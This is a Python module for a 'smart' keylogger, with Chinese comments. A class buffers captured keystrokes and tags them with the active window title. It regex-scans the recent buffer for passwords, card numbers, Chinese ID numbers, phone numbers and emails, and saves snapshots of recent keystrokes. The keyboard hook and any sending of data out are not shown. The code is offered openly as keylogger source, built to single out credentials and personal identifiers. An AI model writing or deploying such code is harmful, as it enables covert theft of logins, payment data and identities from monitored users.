"""
智能键盘记录 — 在基础Hook上加了上下文分析

额外做的事：
1. 活动窗口标题捕获 — 搞清楚"按键输入到了哪个应用"
2. 敏感模式识别 — 自动标记密码、银行卡号等
3. 定时快照 — 隔段时间保存一次按键上下文
"""

import re
import time
import threading
from datetime import datetime


# 敏感信息正则
SENSITIVE_PATTERNS = {
    "password_pattern": re.compile(
        r'(password|passwd|pwd|密码|口令)', re.IGNORECASE
    ),
    "credit_card_pattern": re.compile(
        r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'
    ),
    "id_card_pattern": re.compile(
        r'\b\d{6}(19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]\b'
    ),
    "phone_pattern": re.compile(r'\b1[3-9]\d{9}\b'),
    "email_pattern": re.compile(r'\b[\w.-]+@[\w.-]+\.\w+\b'),
    "ip_pattern": re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b'),
}


class SmartKeyLogger:
    """
    不只是记录按键，还要理解按键的上下文
    """

    def __init__(self):
        self.buffer = ""
        self.window_title = "Unknown"
        self.sensitive_matches = []
        self.total_keystrokes = 0
        self.start_time = None
        self.snapshots = []
        self._snapshot_thread = None

    def set_window_title(self, title):
        """更新当前活动窗口标题（外部调用）"""
        if title and title != self.window_title:
            old = self.window_title
            self.window_title = title
            if old != "Unknown":
                self.buffer += f"\n[窗口切换: {old} → {title}]\n"

    def feed_key(self, key_str):
        """
        喂一个按键字符进来，做智能分析

        参数:
            key_str: 按键字符串

        返回:
            dict or None: 检测到敏感模式时返回告警，否则 None
        """
        self.total_keystrokes += 1

        # 特殊按键处理
        special_keys = {
            "Key.enter": "\n",
            "Key.tab": "\t",
            "Key.space": " ",
            "Key.backspace": "<BS>",
            "Key.delete": "<DEL>",
            "Key.esc": "<ESC>",
        }

        if key_str in special_keys:
            self.buffer += special_keys[key_str]
        elif key_str.startswith("Key."):
            self.buffer += f"<{key_str[4:]}>"
        else:
            self.buffer += key_str

        alert = self._scan_sensitive()
        return alert

    def _scan_sensitive(self):
        """扫描缓冲区，看有没有敏感信息"""
        # 只扫描最近500字符，控制性能
        scan_window = self.buffer[-500:] if len(self.buffer) > 500 else self.buffer

        for pattern_name, pattern in SENSITIVE_PATTERNS.items():
            matches = pattern.findall(scan_window)
            if matches:
                return {
                    "alert": True,
                    "pattern": pattern_name,
                    "matches": matches[-3:],  # 最近3个命中
                    "window": self.window_title,
                    "timestamp": datetime.now().isoformat(),
                }

        return None

    def take_snapshot(self):
        """保存当前记录的按键快照"""
        snapshot = {
            "timestamp": datetime.now().isoformat(),
            "window": self.window_title,
            "buffer_length": len(self.buffer),
            "recent_keystrokes": self.buffer[-100:] if len(self.buffer) > 100 else self.buffer,
            "total_keystrokes": self.total_keystrokes,
        }
        self.snapshots.append(snapshot)
        return snapshot

    def get_risk_summary(self):
        """汇总风险数据"""
        return {
            "total_keystrokes": self.total_keystrokes,
            "duration_seconds": (time.time() - self.start_time) if self.start_time else 0,
            "sensitive_alerts": len([s for s in self.snapshots if s.get("alerts")]),
            "windows_monitored": len(set(
                s.get("window", "") for s in self.snapshots
            )),
            "buffer_size": len(self.buffer),
            "snapshot_count": len(self.snapshots),
        }

    def clear(self):
        """清空记录"""
        self.buffer = ""
        self.sensitive_matches = []
        self.snapshots = []
        self.total_keystrokes = 0
